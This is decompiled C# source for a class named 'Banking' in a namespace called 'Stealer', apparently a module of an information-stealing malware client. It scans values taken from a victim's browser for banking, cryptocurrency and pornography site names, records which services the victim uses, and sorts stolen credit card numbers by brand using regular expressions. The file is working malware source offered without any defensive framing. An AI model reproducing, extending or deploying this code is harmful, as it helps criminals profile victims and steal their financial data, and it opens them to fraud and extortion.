using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text.RegularExpressions;
using Client.BrowserConfig;

namespace Stealer
{
	// Token: 0x0200000C RID: 12
	internal sealed class Banking
	{
		// Token: 0x06000037 RID: 55 RVA: 0x000037F4 File Offset: 0x000019F4
		private static bool AppendValue(string value, List<string> domains)
		{
			string text = value.Replace("www.", "").ToLower();
			bool flag = text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo");
			bool flag2;
			if (flag)
			{
				flag2 = false;
			}
			else
			{
				bool flag3 = text.StartsWith(".");
				if (flag3)
				{
					text = text.Substring(1);
				}
				try
				{
					text = new Uri(text).Host;
				}
				catch (UriFormatException)
				{
				}
				text = Path.GetFileNameWithoutExtension(text);
				text = text.Replace(".com", "").Replace(".org", "");
				foreach (string text2 in domains)
				{
					bool flag4 = text.ToLower().Replace(" ", "").Contains(text2.ToLower().Replace(" ", ""));
					if (flag4)
					{
						return false;
					}
				}
				text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
				domains.Add(text);
				flag2 = true;
			}
			return flag2;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003978 File Offset: 0x00001B78
		private static void DetectCryptocurrencyServices(string value)
		{
			foreach (string text in Config.CryptoServices)
			{
				bool flag = value.ToLower().Contains(text) && value.Length < 25;
				if (flag)
				{
					bool flag2 = Banking.AppendValue(value, Counter.DetectedCryptoServices);
					if (flag2)
					{
						Counter.CryptoServices = true;
						break;
					}
				}
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000039F4 File Offset: 0x00001BF4
		private static void DetectBankingServices(string value)
		{
			foreach (string text in Config.BankingServices)
			{
				bool flag = value.ToLower().Contains(text) && value.Length < 25;
				if (flag)
				{
					bool flag2 = Banking.AppendValue(value, Counter.DetectedBankingServices);
					if (flag2)
					{
						Counter.BankingServices = true;
						break;
					}
				}
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003A70 File Offset: 0x00001C70
		private static void DetectPornServices(string value)
		{
			foreach (string text in Config.PornServices)
			{
				bool flag = value.ToLower().Contains(text) && value.Length < 25;
				if (flag)
				{
					bool flag2 = Banking.AppendValue(value, Counter.DetectedPornServices);
					if (flag2)
					{
						Counter.PornServices = true;
						break;
					}
				}
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003AEC File Offset: 0x00001CEC
		public static void ScanData(string value)
		{
			Banking.DetectBankingServices(value);
			Banking.DetectCryptocurrencyServices(value);
			Banking.DetectPornServices(value);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003B04 File Offset: 0x00001D04
		public static string DetectCreditCardType(string number)
		{
			foreach (KeyValuePair<string, Regex> keyValuePair in Banking.CreditCardTypes)
			{
				bool success = keyValuePair.Value.Match(number.Replace(" ", "")).Success;
				if (success)
				{
					return keyValuePair.Key;
				}
			}
			return "Unknown";
		}

		// Token: 0x04000037 RID: 55
		private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
		{
			{
				"Amex Card",
				new Regex("^3[47][0-9]{13}$")
			},
			{
				"BCGlobal",
				new Regex("^(6541|6556)[0-9]{12}$")
			},
			{
				"Carte Blanche Card",
				new Regex("^389[0-9]{11}$")
			},
			{
				"Diners Club Card",
				new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
			},
			{
				"Discover Card",
				new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
			},
			{
				"Insta Payment Card",
				new Regex("^63[7-9][0-9]{13}$")
			},
			{
				"JCB Card",
				new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
			},
			{
				"KoreanLocalCard",
				new Regex("^9[0-9]{15}$")
			},
			{
				"Laser Card",
				new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
			},
			{
				"Maestro Card",
				new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
			},
			{
				"Mastercard",
				new Regex("5[1-5][0-9]{14}$")
			},
			{
				"Solo Card",
				new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
			},
			{
				"Switch Card",
				new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
			},
			{
				"Union Pay Card",
				new Regex("^(62[0-9]{14,17})$")
			},
			{
				"Visa Card",
				new Regex("4[0-9]{12}(?:[0-9]{3})?$")
			},
			{
				"Visa Master Card",
				new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
			},
			{
				"Express Card",
				new Regex("3[47][0-9]{13}$")
			}
		};
	}
}
